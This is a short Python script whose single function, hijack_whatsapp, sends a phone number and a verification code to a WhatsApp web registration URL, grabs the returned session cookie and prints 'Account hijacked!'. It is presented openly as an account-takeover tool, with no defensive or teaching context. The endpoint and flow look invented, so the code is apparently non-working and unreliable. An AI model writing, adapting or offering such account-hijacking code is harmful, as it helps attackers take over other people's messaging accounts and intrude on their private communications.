import requests

def hijack_whatsapp(phone, verification_code):
    url = 'https://web.whatsapp.com/register'
    data = {'phone': phone, 'code': verification_code, 'platform': 'web'}
    try:
        resp = requests.post(url, json=data, timeout=10)
        if resp.status_code == 200:
            session_cookie = resp.cookies.get('sessionid')
            if session_cookie:
                return {'success': True, 'output': f'Account hijacked! Session: {session_cookie[:20]}...'}
            else:
                return {'success': False, 'output': 'Registration succeeded but no session cookie found.'}
        else:
            return {'success': False, 'output': f'Register failed: {resp.status_code} – {resp.text[:200]}'}
    except Exception as e:
        return {'success': False, 'output': str(e)}
